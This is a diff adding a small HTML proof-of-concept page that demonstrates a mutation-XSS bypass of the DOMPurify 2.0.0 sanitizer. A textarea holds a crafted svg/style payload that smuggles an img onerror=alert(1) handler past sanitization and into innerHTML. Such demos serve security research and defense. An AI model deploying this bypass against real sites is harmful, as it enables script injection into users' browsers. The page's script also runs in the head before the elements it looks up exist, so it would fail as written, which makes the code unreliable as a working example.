@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>mXSS Demo</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.0/purify.js"></script>
+
+    <script>
+        const inputElement = document.getElementById('input');
+        const sanitizedElement = document.getElementById('sanitized');
+        const outputElement = document.getElementById('output');
+        const actualElement = document.getElementById('actual');
+
+        function sanitize() {
+            const input = inputElement.value;
+            const sanitized = DOMPurify.sanitize(input);
+            sanitizedElement.textContent = sanitized;
+            outputElement.innerHTML = sanitized;
+            actualElement.textContent = outputElement.innerHTML;
+        }
+
+        inputElement.addEventListener('input', sanitize);
+        sanitize();
+    </script>
+
+</head>
+<body>
+    <textarea id=input style="width:100%; height:80px; font-family:monospace">
+            <svg>
+            </p>
+            <style>
+            <g title="</style><img src onerror=alert(1)>">
+        </textarea>
+    <br>
+    <b>Sanitized:</b>
+    <pre id=sanitized style=white-space:pre-wrap></pre>
+    <br>
+    <br>
+    <b>Actual HTML:</b>
+    <pre id=actual style=white-space:pre-wrap></pre>
+    <br>
+    <br>
+    <b>Written via innerHTML:</b>
+    <span id=output></span>
+
+</body>
+</html>
